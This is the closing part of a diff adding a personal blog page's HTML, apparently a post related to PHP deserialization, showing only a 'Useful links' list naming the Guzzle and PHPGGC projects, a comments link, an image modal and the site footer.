+<h3 class="mt-5" id="useful-links">Useful links</h3>
+<hr>
+<ul>
+<li>
+<p><a href="https://github.com/guzzle/guzzle">Guzzle</a> project by Michael Dowling, Tobias Nyholm, Graham Campbell and <a href="https://github.com/guzzle/guzzle/graphs/contributors">&hellip;</a>.</p>
+</li>
+<li>
+<p><a href="https://github.com/ambionics/phpggc">PHPGGC</a> project from Ambionics, which was originally maintained by Charles Fol and is now maintained by Noël Maccary and Sélim Lanouar.</p>
+</li>
+</ul>
+<h3 class="mt-5" id="commentsquestions">Comments/Questions</h3>
+<hr>
+<p>If you have any questions, please use <a href="https://github.com/mir-hossein/mir-hossein.github.io/issues/1">this link</a> to submit them.</p>
+
+ 
+    </article>
+  
+  </main>
+  
+  <aside class="right-side-content">&nbsp;</aside>
+  
+  <div class="modal fade" id="full-size-modal" aria-hidden="true" role="dialog">
+    <div class="modal-dialog modal-fullscreen bg-dark bg-opacity-50">
+      <div class="modal-content bg-dark bg-opacity-75 overflow-auto">
+        <div class="modal-header border-0">
+          <h5 class="modal-title text-white">&nbsp;</h5>
+        </div>
+        
+        <div class="modal-body mx-auto">
+          <img id="full-size-img"  src="https://mir-hossein.github.io/icons/home.png" />
+        </div>
+        
+        <div class="position-fixed top-0 end-0 my-3 container-fluid">
+          <button type="button" class="btn btn-danger w-100" data-bs-dismiss="modal" aria-label="close">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <footer class="containter-fluid text-center mx-auto text-white">
+    <div class="row">
+      <section class="col align-self-center">
+        &copy; 2022-2026
+      </section>
+    
+      <section class="col footer-center align-self-center">
+        <a href="https://mir-hossein.github.io/" title="Home">
+          <img src="https://mir-hossein.github.io/icons/home.png" alt="Home"/>
+        </a>
+        
+        <a href="https://github.com/mir-hossein" title="Github">
+          <img src="https://mir-hossein.github.io/icons/github.png" alt="Github"/>
+        </a>
+        
+        <a href="https://mir-hossein.github.io/about" title="About me">
+          <img src="https://mir-hossein.github.io/icons/person.png" alt="About Me"/>
+        </a>
+        
+        <a href="#" title="Up">
+          <img src="https://mir-hossein.github.io/icons/upward-arrow.png"/>
+        </a>
+      </section>
+    
+      <section class="col align-self-center">
+        Powered by <a href="https://gohugo.io/">Hugo</a> & My <img src="https://mir-hossein.github.io/icons/heart.png" class="powered-by heartbeat" alt="Heart"><br>    
+        Theme by <a href="https://mir-hossein.github.io/theme/" class="text-danger">MHR</a><br>
+        Icons by <a href="https://icons8.com" class="text-success">icons8.com</a>
+      </section>
+    </div>
+  </footer>
+</body>
+</html>
